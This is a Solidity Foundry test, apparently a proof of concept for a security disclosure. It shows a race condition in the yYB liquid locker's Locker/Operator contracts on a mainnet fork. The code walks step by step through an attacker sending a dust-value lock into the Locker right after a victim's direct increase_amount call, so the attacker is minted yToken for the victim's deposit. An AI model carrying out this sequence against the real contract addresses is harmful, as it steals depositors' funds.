// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

interface ILockerLike {
    function TOKEN() external view returns (address);
    function escrow() external view returns (address);
    function owner() external view returns (address);
}

interface IOperatorLike {
    function yToken() external view returns (address);
    function cachedLockedAmount() external view returns (uint256);
    function getLockedAmount() external view returns (uint256);
}

interface IEscrowLike {
    function locked(address) external view returns (int256, uint256);
    function create_lock(uint256 _value, uint256 _unlock_time) external;
    function increase_amount(uint256 _value, address _for) external;
    function infinite_lock_toggle() external;
    function safeTransferFrom(address owner, address to, uint256 token_id, bytes calldata data) external;
}

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

/// @notice Proves that YearnRoleManager-adjacent Locker/Operator/escrow system for the
/// Yield-Basis liquid locker (yYB) lets an unrelated attacker capture yYB minted for
/// value ANOTHER party deposited, via a race condition:
///
/// 1. Locker.sol's own selector-block against escrow.increase_amount only protects calls
///    ROUTED THROUGH Locker itself - but increase_amount(uint256,address) is a public,
///    permissionless function on the escrow that anyone can call directly.
/// 2. Operator.nftTransferCallback mints yToken = (real locked balance - cachedLockedAmount)
///    to WHOEVER triggers the next NFT transfer into the Locker - not to whoever actually
///    grew the real balance.
///
/// So: a "victim" (or anyone/anything) growing the real balance via a direct increase_amount
/// call creates an unclaimed gap. An attacker who owns even a dust-value veYB position can
/// race to transfer it into the Locker next, and captures the ENTIRE gap as freshly minted
/// yToken - not just their own dust contribution.
contract LockerRaceMint is Test {
    address constant LOCKER = 0x0000000C90799449af8eE0B240Da639144a36C6A;
    address constant OPERATOR = 0x1111111Ecd5Ae05422aeCe517072ec33Dbf34af9;

    ILockerLike locker = ILockerLike(LOCKER);
    IOperatorLike operatorC = IOperatorLike(OPERATOR);
    IEscrowLike escrow;
    IERC20Like token;
    IERC20Like yToken;

    address victim = address(0xf1ce04511157301721cd59A7Ce9C0aE9b48Ab119);
    address attacker = address(0xa77Accee1D7DBC64299f76E29c33E9f27B2fd62e);

    uint256 constant WEEK = 7 days;
    uint256 constant UMAXTIME = 4 * 365 days; // also reused by the escrow as the min deposit value

    function setUp() public {
        string memory rpc = vm.envString("ALCHEMY_MAINNET_URL");
        vm.createSelectFork(rpc);

        escrow = IEscrowLike(locker.escrow());
        token = IERC20Like(locker.TOKEN());
        yToken = IERC20Like(operatorC.yToken());

        // Fund both accounts generously with the real locked token via Foundry's deal(),
        // bypassing whatever the token's real mint/faucet restrictions are - this is just
        // to give the test accounts something real to work with, not part of the exploit.
        deal(address(token), victim, 10_000_000e18);
        deal(address(token), attacker, 1e18);
    }

    function test_attackerCapturesVictimsDepositViaRaceCondition() public {
        uint256 cachedBefore = operatorC.cachedLockedAmount();
        uint256 realBefore = operatorC.getLockedAmount();
        console2.log("Before: cachedLockedAmount =", cachedBefore);
        console2.log("Before: real getLockedAmount() =", realBefore);
        assertEq(cachedBefore, realBefore, "sanity: cache should start in sync");

        // --- Step 1: victim deposits real value directly into the Locker's lock,
        // completely bypassing Locker.sol / Operator.sol (no code from either is executed). ---
        uint256 victimDeposit = 5_000_000e18;
        vm.startPrank(victim);
        token.approve(address(escrow), victimDeposit);
        escrow.increase_amount(victimDeposit, LOCKER);
        vm.stopPrank();

        uint256 realAfterVictim = operatorC.getLockedAmount();
        uint256 cachedAfterVictim = operatorC.cachedLockedAmount();
        console2.log("After victim's direct increase_amount:");
        console2.log("  real getLockedAmount()   =", realAfterVictim);
        console2.log("  cachedLockedAmount       =", cachedAfterVictim, "(unchanged - now STALE)");
        assertGt(realAfterVictim, cachedAfterVictim, "real balance should now exceed the stale cache");

        // --- Step 2: attacker, a completely unrelated party, creates a dust-value lock
        // and immediately transfers it into the Locker to trigger the mint callback. ---
        vm.startPrank(attacker);
        token.approve(address(escrow), UMAXTIME);
        escrow.create_lock(UMAXTIME, block.timestamp + UMAXTIME); // minimum-value lock
        escrow.infinite_lock_toggle(); // required to satisfy the Locker's transfer eligibility check
        uint256 attackerTokenId = uint256(uint160(attacker));
        uint256 yBalBefore = yToken.balanceOf(attacker);

        escrow.safeTransferFrom(attacker, LOCKER, attackerTokenId, abi.encode(attacker));
        vm.stopPrank();

        uint256 yBalAfter = yToken.balanceOf(attacker);
        uint256 minted = yBalAfter - yBalBefore;

        console2.log("Attacker's dust contribution:", UMAXTIME);
        console2.log("Attacker's yToken minted:    ", minted);
        console2.log("Victim's actual deposit:     ", victimDeposit);

        // The attacker contributed only a dust-value lock, but the mint should reflect
        // the ENTIRE gap - the victim's real deposit plus the attacker's own dust -
        // proving the victim's contribution was captured by an unrelated party.
        assertGt(minted, victimDeposit, "VULNERABLE: attacker minted far more than their own dust contribution");

        console2.log("Operator.cachedLockedAmount after attacker's transfer:", operatorC.cachedLockedAmount());
        assertEq(operatorC.cachedLockedAmount(), operatorC.getLockedAmount(), "cache resynced after the race");
    }
}
